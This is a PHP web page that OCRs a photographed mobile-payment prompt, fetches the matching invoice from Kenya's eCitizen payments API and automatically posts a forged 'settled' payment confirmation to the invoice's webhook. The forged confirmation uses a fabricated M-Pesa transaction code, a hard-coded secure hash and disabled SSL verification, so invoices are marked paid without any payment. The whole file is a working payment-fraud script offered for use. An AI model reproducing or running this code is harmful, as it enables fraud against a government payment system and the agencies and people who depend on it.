<?php
function generateMpesaCode()
{
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $alphabet1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $alphabet2 = '1234567890';
    $code = '';
    $currentYear = date('Y');
    $code .= $alphabet[$currentYear - 2022 + 16];
    $currentMonth = date('n');
    $code .= $alphabet[$currentMonth - 1];
    $currentDay = date('j');
    if ($currentDay > 9) $code .= $alphabet[($currentDay - 10) % 26];
    else $code .= $currentDay;
    $code .= $alphabet2[rand(0, strlen($alphabet2) - 1)];
    while (strlen($code) < 10) $code .= $alphabet1[rand(0, strlen($alphabet1) - 1)];
    return $code;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
    header('Content-Type: application/json');
    if ($_POST['ajax_action'] === 'fetch_invoice') {
        $code = trim($_POST['code']);
        $fetch_url = "https://payments.ecitizen.go.ke/api/invoice/checkout/{$code}?callback_url=https://bomayangu.go.ke/payments";
        $invoice_html = @file_get_contents($fetch_url);
        if ($invoice_html !== false && preg_match('/<mpesa-v2\s+([^>]+)>/i', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\w+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $msisdn = $attributes['msisdn'] ?? '';
        }
        if ($invoice_html !== false && preg_match('/<airtel-v3\s+([^>]+)>/i', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\w+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
            echo json_encode([
                'status' => 'success',
                'data' => [
                    'amount' => $attributes['amount_net'] ?? '',
                    'bill_ref' => $attributes['bill_ref'] ?? '',
                    'invoice_no' => $attributes['invoice_no'] ?? '',
                    'notification_url' => $attributes['notification_url'] ?? '',
                    'msisdn' => $msisdn ?? '+254700000000',
                    'date_iso' => $now->format(DateTime::ATOM),
                    'date_custom' => $now->format("Y-m-d H:i:sP T e")
                ]
            ]);
            exit;
        } elseif ($invoice_html !== false && preg_match('/<tkash\s+([^>]+)>/i', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\w+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
            echo json_encode([
                'status' => 'success',
                'data' => [
                    'amount' => $attributes['amount_net'] ?? '',
                    'bill_ref' => $attributes['bill_ref'] ?? '',
                    'invoice_no' => $attributes['invoice_no'] ?? '',
                    'notification_url' => $attributes['notification_url'] ?? '',
                    'msisdn' => $msisdn ?? '+254700000000',
                    'date_iso' => $now->format(DateTime::ATOM),
                    'date_custom' => $now->format("Y-m-d H:i:sP T e")
                ]
            ]);
            exit;
        } elseif ($invoice_html !== false && preg_match('/<iframe-v3\b(.*?)\/?>/is', $invoice_html, $match)) {
            $attributes = [];
            preg_match_all('/(\:\w+|[\w\-]+)="([^"]*)"/', $match[1], $pairs, PREG_SET_ORDER);
            foreach ($pairs as $pair) $attributes[$pair[1]] = $pair[2];
            $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
            $jsonObj_1 = $attributes[':invoice'] ?? '';
            $obj_1 = json_decode(html_entity_decode($jsonObj_1), true);
            if (isset($obj_1['status'])) {
                echo json_encode([
                    'status' => 'success',
                    'data' => [
                        'amount' => $obj_1['amount_net'] ?? '',
                        'bill_ref' => $obj_1['client_invoice_ref'] ?? '',
                        'invoice_no' => $obj_1['invoice_number'] ?? '',
                        'notification_url1' => $obj_1['service']['metadata']['metadata']['webhook_url'] ?? '',
                        'notification_url' => 'https://app.kwspay.ecitizen.go.ke/api/payment/confirm',
                        'msisdn' => $obj_1['msisdn'] ?? '+254700000000',
                        'date_iso' => $now->format(DateTime::ATOM),
                        'date_custom' => $now->format("Y-m-d H:i:sP T e")
                    ]
                ]);
                exit;
            } else {
                echo json_encode(['status' => 'error', 'message' => 'iFrame 3 Loaded. No Object.']);
                exit;
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Invoice not found.']);
            exit;
        }
    }
    if ($_POST['ajax_action'] === 'send_notification') {
        $notification_url = $_POST['notification_url'];
        $amount = $_POST['amount'];
        $bill_ref = $_POST['bill_ref'];
        $invoice_no = $_POST['invoice_no'];
        $msisdn = $_POST['msisdn'];
        $now = new DateTime("now", new DateTimeZone("Africa/Nairobi"));
        $payment_date_iso = $now->format(DateTime::ATOM);
        $payment_date_custom = $now->format("Y-m-d H:i:sP T e");
        $payload = [
            "status" => "settled",
            "secure_hash" => "NTk4NGE3NTIxNjk4OTg2MjhmMWZmMzU4NmU4NDBmYmVlYWVlYTMxN2E1MWMwYzg4MTU3YTBmN2Q0NGQ3ZjUyMA==",
            "phone_number" => $msisdn,
            "payment_reference" => [[
                "payment_reference" => generateMpesaCode(),
                "payment_date" => $payment_date_iso,
                "inserted_at" => $payment_date_iso,
                "currency" => "KES",
                "amount" => $amount
            ]],
            "payment_date" => $payment_date_custom,
            "payment_channel" => "MPESA",
            "last_payment_amount" => "0",
            "invoice_number" => $invoice_no,
            "invoice_amount" => $amount . ".00",
            "currency" => "KES",
            "client_invoice_ref" => $bill_ref,
            "amount_paid" => $amount
        ];
        $ch = curl_init($notification_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, value: 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $response = curl_exec($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        echo json_encode([
            'status' => ($http_status === 200 || $http_status === 201) ? 'success' : 'error',
            'message' => $response . '<br/> Status Code: ' . $http_status . '<br/><br/>' . json_encode($payload, JSON_PRETTY_PRINT)
        ]);
        exit;
    }
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>Fast STK Scan & OCR</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4.0.2/dist/tesseract.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            background: #111;
            color: #eee;
            font-family: sans-serif;
        }

        #ocrresult,
        #result {
            background: #222;
            color: #fff;
            min-height: 90px;
            white-space: pre-wrap;
            margin-top: 10px;
        }

        #preview {
            max-width: 95vw;
            max-height: 22vh;
            margin-top: 1em;
            border-radius: 8px;
        }

        .btn {
            margin: 10px 0;
            padding: 12px 18px;
            border-radius: 8px;
            font-size: 1.15em;
        }

        input[type="file"] {
            display: none;
        }

        #codeinput {
            display: none;
        }

        .center {
            text-align: center;
        }
    </style>
</head>

<body>
    <h3 class="center">STK Push: Camera → OCR → API (Ultra Fast)</h3>
    <div class="center">
        <button id="scanBtn" class="btn" style="background:#fa0; color:#111;">Scan STK Push</button>
        <input type="file" id="photoInput" accept="image/*" capture="environment">
        <br>
        <img id="preview" alt=""><br>
    </div>
    <div id="ocrresult"></div>
    <form id="codeinput">
        <input type="text" id="code" name="code">
        <button type="submit">Fetch</button>
    </form>
    <div id="result"></div>

    <script>
        let imageDataURL = null;
        let t0, t1;

        // Tap to scan
        $('#scanBtn').on('click', () => {
            $('#photoInput').click();
        });

        // Auto-rotate portrait images to landscape for OCR
        $('#photoInput').on('change', function(e) {
            if (!e.target.files.length) return;
            let file = e.target.files[0];
            let reader = new FileReader();
            reader.onload = function(ev) {
                let img = new Image();
                img.onload = function() {
                    let MAX_WIDTH = 800;
                    let scale = Math.min(1, MAX_WIDTH / Math.max(img.width, img.height));
                    let w = img.width * scale;
                    let h = img.height * scale;
                    let canvas = document.createElement('canvas');
                    let ctx = canvas.getContext('2d');
                    if (img.height > img.width) {
                        canvas.width = h;
                        canvas.height = w;
                        ctx.save();
                        ctx.translate(h / 2, w / 2);
                        ctx.rotate(90 * Math.PI / 180);
                        ctx.drawImage(img, -w / 2, -h / 2, w, h);
                        ctx.restore();
                    } else {
                        canvas.width = w;
                        canvas.height = h;
                        ctx.drawImage(img, 0, 0, w, h);
                    }
                    document.getElementById('preview').src = canvas.toDataURL();
                    imageDataURL = canvas.toDataURL();
                    runOCR();
                }
                img.src = ev.target.result;
            }
            reader.readAsDataURL(file);
        });


        function runOCR() {
            if (!imageDataURL) {
                $('#ocrresult').text("No image loaded!");
                return;
            }
            $('#ocrresult').text("Running OCR...");
            t0 = performance.now();
            Tesseract.recognize(
                imageDataURL,
                'eng', {
                    logger: m => console.log(m)
                }
            ).then(({
                data: {
                    text
                }
            }) => {
                $('#ocrresult').text(text);
                // Extract account code using robust regex (support LZZKZMAP, etc)
                let code = null;
                let re = /Account\s*no\.?\s*([A-Z0-9]{6,12})/i;
                let m = text.match(re);
                if (!m) m = text.match(/([A-Z0-9]{8,12})/);
                if (m) code = m[1].trim();
                if (code) {
                    $('#ocrresult').append("\n\nEXTRACTED CODE: " + code);
                    // Autofill code and trigger API fetch
                    $('#code').val(code);
                    $('#codeinput').trigger('submit');
                } else {
                    $('#ocrresult').append("\n\nNo code found! Try cropping or retaking.");
                }
            });
        }

        // Handle code fetch and API notification - fully automated!
        $('#codeinput').on('submit', function(e) {
            e.preventDefault();
            let code = $('#code').val();
            $('#result').html("Fetching invoice…");
            $.post('', {
                ajax_action: 'fetch_invoice',
                code
            }, function(res) {
                if (res.status === 'success') {
                    let d = res.data;
                    // Auto-fire notification
                    $('#result').html("Invoice OK! Sending notification…");
                    $.post('', {
                        ajax_action: 'send_notification',
                        notification_url: d.notification_url,
                        amount: d.amount,
                        bill_ref: d.bill_ref,
                        invoice_no: d.invoice_no,
                        msisdn: d.msisdn
                    }, function(resp) {
                        t1 = performance.now();
                        let elapsed = ((t1 - t0) / 1000).toFixed(3);
                        $('#result').html(
                            "<b>API Response:</b><br>" + resp.message +
                            "<br><b>Elapsed time: " + elapsed + "s</b>"
                        );
                    }, 'json');
                } else {
                    $('#result').html('<span style="color:#f33">' + res.message + '</span>');
                }
            }, 'json');
        });
    </script>
</body>

</html>